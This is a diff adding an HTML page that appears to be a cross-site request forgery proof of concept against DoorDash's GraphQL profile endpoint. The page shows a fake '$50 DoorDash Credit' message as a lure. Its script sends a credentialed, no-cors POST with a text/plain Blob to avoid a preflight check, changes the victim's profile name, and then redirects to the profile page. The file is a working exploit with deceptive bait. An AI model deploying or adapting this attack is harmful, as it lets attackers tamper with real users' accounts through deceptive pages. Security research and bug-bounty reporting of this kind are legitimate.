@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="referrer" content="no-referrer">
+</head>
+<body>
+    <h1>Processing your $50 DoorDash Credit...</h1>
+    <p>Please wait a moment while we verify your session.</p>
+
+    <script>
+        const targetUrl = "https://www.doordash.com/graphql/editConsumerProfileInformation?_method=GET";
+        
+        const payload = JSON.stringify({
+            operationName: "editConsumerProfileInformation",
+            variables: {
+                firstName: "CSRF",
+                lastName: "Vulnerable"
+            },
+            query: "mutation editConsumerProfileInformation($firstName: String, $lastName: String) { updateConsumerProfileInformation(firstName: $firstName, lastName: $lastName) { id firstName lastName } }"
+        });
+
+        // This trick uses a Blob to send a "Simple Request" (no preflight)
+        // but tricks the server into seeing the correct JSON format.
+        const blob = new Blob([payload], { type: 'text/plain' });
+
+        fetch(targetUrl, {
+            method: "POST",
+            mode: "no-cors",
+            credentials: "include", 
+            body: blob
+        }).then(() => {
+            // Wait 2 seconds for server to process, then check profile
+            setTimeout(() => {
+                window.location.href = "https://www.doordash.com/consumer/profile/";
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
